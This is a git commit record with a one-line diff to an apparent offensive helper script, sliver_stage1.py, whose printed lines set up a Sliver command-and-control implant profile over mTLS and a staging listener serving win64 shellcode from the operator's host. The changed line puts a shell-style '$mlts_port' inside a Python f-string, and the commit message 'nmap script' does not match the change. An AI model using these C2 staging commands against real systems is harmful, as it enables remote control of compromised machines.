bedc79a0fc95f048a612e63af936b3c6c34a8b21
l4rry <l4rryxz@gmail.com>
2023-09-30 08:42:45 +0200

    nmap script

--- sliver_stage1.py
+++ sliver_stage1.py
@@ -30,7 +30,7 @@ End Sub
 
    # Start Printing Output :)
    print (CRED + '==== Sliver Stager Setup ====\n' + CEND)
-   print (f'profiles new --mtls {lhost} --format shellcode win64\n')
+   print (f'profiles new --mtls {lhost}:$mlts_port --format shellcode win64\n')
    print (f'stage-listener --url http://{lhost}:{lport} --profile win64\n')
 
 
